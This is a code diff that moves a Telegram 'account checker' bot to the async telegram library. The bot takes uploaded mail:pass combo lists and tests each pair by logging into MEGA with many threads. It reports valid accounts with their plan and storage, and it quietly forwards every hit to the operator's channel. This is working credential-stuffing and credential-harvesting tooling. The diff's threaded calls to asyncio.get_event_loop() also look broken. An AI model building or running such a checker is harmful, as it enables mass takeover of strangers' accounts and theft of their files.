@@ -1,11 +1,19 @@
-
 import os
 import concurrent.futures
 import time
 import threading
+import asyncio
 from queue import Queue, Empty
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
+from telegram.ext import (
+    Application,
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    filters,
+    ContextTypes
+)
 from mega import Mega
 import json
 from datetime import datetime
@@ -19,10 +27,10 @@ import platform
 
 # ------------- CONFIG ----------------
 CONFIG = {
-    "TELEGRAM_BOT_TOKEN": os.getenv("TELEGRAM_BOT_TOKEN"),  # Required
-    "TELEGRAM_CHANNEL_ID": os.getenv("TELEGRAM_CHANNEL_ID"),  # Required
-    "ADMIN_USER_ID": int(os.getenv("ADMIN_USER_ID", 0)),  # Required, default to 0 if not set
-    "FILE_CAP": 5 * 1024 * 1024,             # 5 MB
+    "TELEGRAM_BOT_TOKEN": os.getenv("TELEGRAM_BOT_TOKEN"),
+    "TELEGRAM_CHANNEL_ID": os.getenv("TELEGRAM_CHANNEL_ID"),
+    "ADMIN_USER_ID": int(os.getenv("ADMIN_USER_ID", 0)),
+    "FILE_CAP": 5 * 1024 * 1024,  # 5 MB
     "DATA_DIR": "data",
     "RESULTS_DIR": "results",
     "QUEUE_DIR": "queue",
@@ -79,14 +87,14 @@ def user_stat_inc(user_id, key, incr=1):
         "total_checked": 0,
         "total_valid": 0,
         "total_files": 0,
-        "account_types": {},  # e.g., {"Free": 0, "Pro Lite": 0, ...}
+        "account_types": {},
         "join_date": int(time.time()),
         "last_used": int(time.time()),
         "first_name": "",
         "username": ""
     })
     ud[key] = ud.get(key, 0) + incr
-    ud["last_used"] = int(time.time())  # Update last_used on any stat increment
+    ud["last_used"] = int(time.time())
     save_user_data()
 
 def user_stat_set(user_id, key, val):
@@ -101,7 +109,7 @@ def user_stat_set(user_id, key, val):
         "username": ""
     })
     ud[key] = val
-    ud["last_used"] = int(time.time())  # Update last_used on any stat set
+    ud["last_used"] = int(time.time())
     save_user_data()
 
 def get_account_type_name(tp):
@@ -117,14 +125,11 @@ def check_mega_account(email, password):
     try:
         mega = Mega()
         account = mega.login(email, password)
-        # Account plan
         info = account.get_user()
         acc_type = get_account_type_name(info.get('accountType', 0))
-        # Storage
         storage_info = account.get_storage_space()
         used = storage_info['used'] / (1024 ** 3)
         total = storage_info['total'] / (1024 ** 3)
-        # File/folder count
         file_tree = account.get_files()
         files, folders = get_file_folder_count(file_tree)
         return {
@@ -159,7 +164,10 @@ def process_queue():
                 except Exception as e:
                     logger.error(f"Error processing file for user {user_id}: {str(e)}")
                     try:
-                        context.bot.send_message(chat_id=user_id, text="😵 Oops, something broke! Try again.")
+                        asyncio.run_coroutine_threadsafe(
+                            context.bot.send_message(chat_id=user_id, text="😵 Oops, something broke! Try again."),
+                            asyncio.get_event_loop()
+                        )
                     except Exception:
                         pass
                 with processing_lock:
@@ -183,11 +191,14 @@ def process_user_file(user_id, file_path, context):
         credentials = [line.strip() for line in f if ':' in line and line.count(':') == 1]
     total = len(credentials)
     if not total:
-        context.bot.send_message(chat_id=user_id, text="🙈 Your file is empty or not in mail:pass format.")
+        asyncio.run_coroutine_threadsafe(
+            context.bot.send_message(chat_id=user_id, text="🙈 Your file is empty or not in mail:pass format."),
+            asyncio.get_event_loop()
+        )
         return
     with processing_lock:
         processing_stats[user_id]["total"] = total
-    user_stat_inc(user_id, "total_files")  # Increment total_files
+    user_stat_inc(user_id, "total_files")
     hit_lines = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["MAX_THREADS"]) as executor:
         futures = {executor.submit(check_mega_account, *line.split(':',1)): line for line in credentials}
@@ -208,19 +219,22 @@ def process_user_file(user_id, file_path, context):
                              f"[Files: {result['files']}, Folders: {result['folders']}]\n")
                 FileManager.safe_write(valid_file, combo_str)
                 hit_lines.append(combo_str)
-                context.bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML")
-                # Send hit to admin channel/group
-                context.bot.send_message(chat_id=CONFIG["TELEGRAM_CHANNEL_ID"], text=msg, parse_mode="HTML")
+                asyncio.run_coroutine_threadsafe(
+                    context.bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML"),
+                    asyncio.get_event_loop()
+                )
+                asyncio.run_coroutine_threadsafe(
+                    context.bot.send_message(chat_id=CONFIG["TELEGRAM_CHANNEL_ID"], text=msg, parse_mode="HTML"),
+                    asyncio.get_event_loop()
+                )
                 valid_accounts.append((email, pwd, result['plan'], result['used'], result['total']))
                 user_stat_inc(user_id, "total_valid")
-                # Track account type
                 ud = user_data["users"].setdefault(str(user_id), {})
                 account_types = ud.get("account_types", {})
                 account_types[result["plan"]] = account_types.get(result["plan"], 0) + 1
                 user_stat_set(user_id, "account_types", account_types)
             else:
                 FileManager.safe_write(invalid_file, f"{line} | Error: {result['error']}")
-            # Progress bar every 10%
             with processing_lock:
                 processing_stats[user_id]["valid"] += int(result["valid"])
                 processing_stats[user_id]["invalid"] += int(not result["valid"])
@@ -228,44 +242,57 @@ def process_user_file(user_id, file_path, context):
             if (i+1) % max(1,total//10) == 0 or (i+1) == total:
                 progress = int((stats["valid"] + stats["invalid"])/stats["total"]*100)
                 bar = '█'*int(20*progress/100)+'-'*(20-int(20*progress/100))
-                context.bot.send_message(chat_id=user_id, text=f"⏳ Progress: {progress}% [{bar}]\n✅ {stats['valid']} | ❌ {stats['invalid']}")
-    # Combo stats
+                asyncio.run_coroutine_threadsafe(
+                    context.bot.send_message(chat_id=user_id, text=f"⏳ Progress: {progress}% [{bar}]\n✅ {stats['valid']} | ❌ {stats['invalid']}"),
+                    asyncio.get_event_loop()
+                )
     domain_counts = Counter(domains)
     msg = (f"🏁 Done!\nTotal checked: {total}\n"
            f"✅ Valid: {stats['valid']} ({stats['valid']/total*100:.2f}%)\n"
            f"❌ Invalid: {stats['invalid']}\n"
            f"🌍 Domains: " + ", ".join(f"{d}: {n}" for d,n in domain_counts.items()) + "\n"
            f"📊 Avg storage: {sum(storages)/len(storages):.2f}GB" if storages else "")
-    context.bot.send_message(chat_id=user_id, text=msg)
-    # Pie chart
+    asyncio.run_coroutine_threadsafe(
+        context.bot.send_message(chat_id=user_id, text=msg),
+        asyncio.get_event_loop()
+    )
     if domains:
         plt.figure(figsize=(5,5))
         plt.pie(domain_counts.values(), labels=domain_counts.keys(), autopct='%1.1f%%')
         plt.title("Domain Distribution")
         buf = io.BytesIO()
         plt.savefig(buf, format='png'); buf.seek(0)
-        context.bot.send_photo(chat_id=user_id, photo=buf, caption="📊 Domain breakdown!")
+        asyncio.run_coroutine_threadsafe(
+            context.bot.send_photo(chat_id=user_id, photo=buf, caption="📊 Domain breakdown!"),
+            asyncio.get_event_loop()
+        )
         buf.close()
-    # Branded result
     FileManager.safe_write(valid_file, "\n"+CONFIG["BOT_BRAND"])
-    # Send files to user and admin
     if os.path.exists(valid_file) and os.path.getsize(valid_file)>0:
         with open(valid_file, "rb") as f:
-            context.bot.send_document(chat_id=user_id, document=f, caption="✅ Your valid accounts!")
+            asyncio.run_coroutine_threadsafe(
+                context.bot.send_document(chat_id=user_id, document=f, caption="✅ Your valid accounts!"),
+                asyncio.get_event_loop()
+            )
         with open(valid_file, "rb") as f:
-            context.bot.send_document(chat_id=CONFIG["TELEGRAM_CHANNEL_ID"], document=f, caption="New hits!")
+            asyncio.run_coroutine_threadsafe(
+                context.bot.send_document(chat_id=CONFIG["TELEGRAM_CHANNEL_ID"], document=f, caption="New hits!"),
+                asyncio.get_event_loop()
+            )
         os.remove(valid_file)
     if os.path.exists(invalid_file) and os.path.getsize(invalid_file)>0:
         with open(invalid_file, "rb") as f:
-            context.bot.send_document(chat_id=user_id, document=f, caption="❌ Invalid accounts.")
+            asyncio.run_coroutine_threadsafe(
+                context.bot.send_document(chat_id=user_id, document=f, caption="❌ Invalid accounts."),
+                asyncio.get_event_loop()
+            )
         os.remove(invalid_file)
-    # User stats
     user_stat_inc(user_id, "total_checked", total)
     user_stat_set(user_id, "last_combo", int(time.time()))
-    # Move file to processed
     try:
         os.rename(file_path, os.path.join(CONFIG["PROCESSED_DIR"], os.path.basename(file_path)))
-    except: pass
+    except:
+        pass
 
 class FileManager:
     @staticmethod
@@ -282,7 +309,7 @@ class FileManager:
 def check_admin(uid):
     return int(uid) == int(CONFIG["ADMIN_USER_ID"])
 
-def start(update: Update, context: CallbackContext):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     username = update.effective_user.username or "N/A"
     first_name = update.effective_user.first_name or "Unknown"
@@ -298,7 +325,7 @@ def start(update: Update, context: CallbackContext):
             "username": username
         }
         save_user_data()
-    update.message.reply_text(
+    await update.message.reply_text(
         f"👋 Hi {first_name}!\n"
         "Drop a .txt file with <code>mail:pass</code> per line to check accounts.\n"
         f"📁 Max file size: 5 MB. No limits. Totally free!\n"
@@ -309,7 +336,7 @@ def start(update: Update, context: CallbackContext):
         ])
     )
 
-def help_command(update: Update, context: CallbackContext):
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
         "<b>Account Checker Bot Help</b>\n\n"
         "• Upload a .txt file with <code>mail:pass</code> on each line.\n"
@@ -322,9 +349,9 @@ def help_command(update: Update, context: CallbackContext):
         "• /admin — [Admin] Panel.\n"
         "• Admin: full access to all commands."
     )
-    update.message.reply_text(msg, parse_mode="HTML")
+    await update.message.reply_text(msg, parse_mode="HTML")
 
-def my_stats(update: Update, context: CallbackContext):
+async def my_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     stats = user_data["users"].get(user_id, {})
     msg = (
@@ -333,9 +360,9 @@ def my_stats(update: Update, context: CallbackContext):
         f"Valid accounts: {stats.get('total_valid', 0)}\n"
         f"Last combo: {datetime.utcfromtimestamp(stats.get('last_combo',0)).strftime('%Y-%m-%d %H:%M') if stats.get('last_combo') else 'N/A'}"
     )
-    update.message.reply_text(msg)
+    await update.message.reply_text(msg)
 
-def status(update: Update, context: CallbackContext):
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     with processing_lock:
         if current_processing and current_processing[0] == user_id:
@@ -343,7 +370,7 @@ def status(update: Update, context: CallbackContext):
             if stats:
                 progress = int((stats["valid"] + stats["invalid"]) / stats["total"] * 100)
                 bar = '█'*int(20*progress/100)+'-'*(20-int(20*progress/100))
-                update.message.reply_text(
+                await update.message.reply_text(
                     f"⚙️ Your file is being processed!\n"
                     f"Progress: {progress}% [{bar}]\n"
                     f"✅ Valid: {stats['valid']}\n"
@@ -359,29 +386,29 @@ def status(update: Update, context: CallbackContext):
                 in_queue = True
                 break
     if in_queue:
-        update.message.reply_text(f"⏳ Your file is in the queue!\nQueue Position: {queue_size}")
+        await update.message.reply_text(f"⏳ Your file is in the queue!\nQueue Position: {queue_size}")
     else:
-        update.message.reply_text("🛌 Nothing in progress for you. Upload a file to start checking!")
+        await update.message.reply_text("🛌 Nothing in progress for you. Upload a file to start checking!")
 
-def handle_document(update: Update, context: CallbackContext):
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     doc = update.message.document
     if not doc.file_name.lower().endswith(".txt"):
-        update.message.reply_text("Please upload a .txt file (mail:pass per line).")
+        await update.message.reply_text("Please upload a .txt file (mail:pass per line).")
         return
     if doc.file_size > CONFIG["FILE_CAP"]:
-        update.message.reply_text("❌ File is too big! Max 5 MB per upload.")
+        await update.message.reply_text("❌ File is too big! Max 5 MB per upload.")
         return
-    file = context.bot.get_file(doc.file_id)
+    file = await context.bot.get_file(doc.file_id)
     unique_timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
     file_path = os.path.join(CONFIG["QUEUE_DIR"], f"combo_{user_id}_{unique_timestamp}.txt")
-    file.download(file_path)
+    await file.download_to_drive(file_path)
     valid_lines = []
     with open(file_path, "r", encoding="utf-8") as f:
         for line in f:
             if ':' in line and line.count(':') == 1: valid_lines.append(line.strip())
     if not valid_lines:
-        update.message.reply_text("No valid mail:pass lines found.")
+        await update.message.reply_text("No valid mail:pass lines found.")
         os.remove(file_path)
         return
     with open(file_path, "w", encoding="utf-8") as f:
@@ -390,14 +417,13 @@ def handle_document(update: Update, context: CallbackContext):
         processing_queue.put((user_id, file_path, context))
     queue_position = processing_queue.qsize()
     if current_processing: queue_position += 1
-    update.message.reply_text(
+    await update.message.reply_text(
         f"📥 File received!\nQueue Position: {queue_position}\nValid Lines: {len(valid_lines)}\nProcessing will start soon.\nUse /status to check progress."
     )
 
-# --------- ADMIN PANEL -----------
-def admin_panel(update: Update, context: CallbackContext):
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_admin(update.effective_user.id):
-        update.message.reply_text("Admin only.")
+        await update.message.reply_text("Admin only.")
         return
     keyboard = [
         [InlineKeyboardButton("Live Stats", callback_data='admin_stats')],
@@ -408,35 +434,34 @@ def admin_panel(update: Update, context: CallbackContext):
         [InlineKeyboardButton("Broadcast", callback_data='admin_broadcast')],
         [InlineKeyboardButton("User Data Backup", callback_data='admin_backup')],
     ]
-    update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-def admin_button(update: Update, context: CallbackContext):
+async def admin_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = str(query.from_user.id)
     data = query.data
-    query.answer()
+    await query.answer()
     if not check_admin(user_id):
-        query.message.reply_text("Admin only.")
+        await query.message.reply_text("Admin only.")
         return
     if data == 'admin_stats':
-        # Most active users, most common domains, etc
         stats = sorted(((u, d.get('total_valid',0)) for u,d in user_data["users"].items()), key=lambda x:x[1], reverse=True)
         msg = f"👑 Top 10 Users by Valid:\n"
         for u, v in stats[:10]:
             name = user_data["users"][u].get("first_name","user")
             msg += f"{name} ({u}): {v} valid\n"
-        query.message.reply_text(msg)
+        await query.message.reply_text(msg)
     elif data == 'admin_userdb':
         db_path = os.path.join(CONFIG["DATA_DIR"], "user.json")
         with open(db_path, "rb") as f:
-            context.bot.send_document(chat_id=user_id, document=f, caption="User DB")
+            await context.bot.send_document(chat_id=user_id, document=f, caption="User DB")
     elif data == 'admin_queue':
         with processing_lock:
             qlist = list(processing_queue.queue)
         msg = f"Queue size: {len(qlist)}\n"
         for i, item in enumerate(qlist):
             msg += f"{i+1}. User {item[0]} | File: {os.path.basename(item[1])}\n"
-        query.message.reply_text(msg)
+        await query.message.reply_text(msg)
     elif data == 'admin_hits':
         hits = []
         for fname in os.listdir(CONFIG["RESULTS_DIR"]):
@@ -448,10 +473,10 @@ def admin_button(update: Update, context: CallbackContext):
             with open(hit_path, "w", encoding="utf-8") as f:
                 f.writelines(hits)
             with open(hit_path, "rb") as f:
-                context.bot.send_document(chat_id=user_id, document=f, caption="All hits")
+                await context.bot.send_document(chat_id=user_id, document=f, caption="All hits")
             os.remove(hit_path)
         else:
-            query.message.reply_text("No hits yet.")
+            await query.message.reply_text("No hits yet.")
     elif data == 'admin_status':
         uptime = int(time.time() - bot_start_time)
         cpu = psutil.cpu_percent()
@@ -462,9 +487,9 @@ def admin_button(update: Update, context: CallbackContext):
             f"OS: {platform.system()} {platform.release()}\n"
             f"Queue: {processing_queue.qsize()}\n"
         )
-        query.message.reply_text(msg)
+        await query.message.reply_text(msg)
     elif data == 'admin_broadcast':
-        query.message.reply_text("Reply to this message with your broadcast text.")
+        await query.message.reply_text("Reply to this message with your broadcast text.")
         context.user_data['await_broadcast'] = True
     elif data == 'admin_backup':
         report_path = os.path.join(CONFIG["DATA_DIR"], f"user_data_backup_{int(time.time())}.txt")
@@ -485,29 +510,29 @@ def admin_button(update: Update, context: CallbackContext):
                     f.write(f"  {acc_type}: {count}\n")
                 f.write("\n")
         with open(report_path, "rb") as f:
-            context.bot.send_document(
+            await context.bot.send_document(
                 chat_id=CONFIG["TELEGRAM_CHANNEL_ID"],
                 document=f,
                 caption="📊 Manual User Data Backup"
             )
         os.remove(report_path)
 
-def admin_broadcast_reply(update: Update, context: CallbackContext):
+async def admin_broadcast_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_admin(update.effective_user.id): return
     if context.user_data.get('await_broadcast'):
         msg = update.message.text
         for uid in user_data["users"]:
             try:
-                context.bot.send_message(chat_id=uid, text=f"📢 ADMIN BROADCAST:\n{msg}")
-            except: pass
-        update.message.reply_text("Broadcast sent to all users.")
+                await context.bot.send_message(chat_id=uid, text=f"📢 ADMIN BROADCAST:\n{msg}")
+            except:
+                pass
+        await update.message.reply_text("Broadcast sent to all users.")
         context.user_data['await_broadcast'] = False
 
-# --------- MAIN -----------
-def hourly_backup(context: CallbackContext):
+# --------- HOURLY BACKUP -----------
+def hourly_backup(bot):
     while True:
         try:
-            # Generate user data report
             report_path = os.path.join(CONFIG["DATA_DIR"], f"user_data_backup_{int(time.time())}.txt")
             with open(report_path, "w", encoding="utf-8") as f:
                 f.write("User Data Backup\n")
@@ -525,36 +550,36 @@ def hourly_backup(context: CallbackContext):
                     for acc_type, count in data.get("account_types", {}).items():
                         f.write(f"  {acc_type}: {count}\n")
                     f.write("\n")
-            # Send to admin channel
             with open(report_path, "rb") as f:
-                context.bot.send_document(
-                    chat_id=CONFIG["TELEGRAM_CHANNEL_ID"],
-                    document=f,
-                    caption="📊 Hourly User Data Backup"
+                asyncio.run_coroutine_threadsafe(
+                    bot.send_document(
+                        chat_id=CONFIG["TELEGRAM_CHANNEL_ID"],
+                        document=f,
+                        caption="📊 Hourly User Data Backup"
+                    ),
+                    asyncio.get_event_loop()
                 )
-            os.remove(report_path)  # Clean up the report file
+            os.remove(report_path)
         except Exception as e:
             logger.error(f"Failed to send hourly backup: {str(e)}")
-        time.sleep(3600)  # Wait 1 hour
+        time.sleep(3600)
 
+# --------- MAIN -----------
 def main():
     load_user_data()
     threading.Thread(target=process_queue, daemon=True).start()
-    updater = Updater(CONFIG["TELEGRAM_BOT_TOKEN"])
-    dp = updater.dispatcher
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("help", help_command))
-    dp.add_handler(CommandHandler("my_stats", my_stats))
-    dp.add_handler(CommandHandler("status", status))
-    dp.add_handler(CommandHandler("admin", admin_panel))
-    dp.add_handler(MessageHandler(filters.document, handle_document))
-    dp.add_handler(CallbackQueryHandler(admin_button))
-    dp.add_handler(MessageHandler(filters.text & filters.reply, admin_broadcast_reply))
-    # Start hourly backup thread
-    threading.Thread(target=hourly_backup, args=(dp.bot,), daemon=True).start()
+    application = ApplicationBuilder().token(CONFIG["TELEGRAM_BOT_TOKEN"]).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("my_stats", my_stats))
+    application.add_handler(CommandHandler("status", status))
+    application.add_handler(CommandHandler("admin", admin_panel))
+    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    application.add_handler(CallbackQueryHandler(admin_button))
+    application.add_handler(MessageHandler(filters.TEXT & filters.REPLY, admin_broadcast_reply))
+    threading.Thread(target=hourly_backup, args=(application.bot,), daemon=True).start()
     logger.info("✅ Bot is live!")
-    updater.start_polling()
-    updater.idle()
+    application.run_polling()
 
 if __name__ == "__main__":
     main()
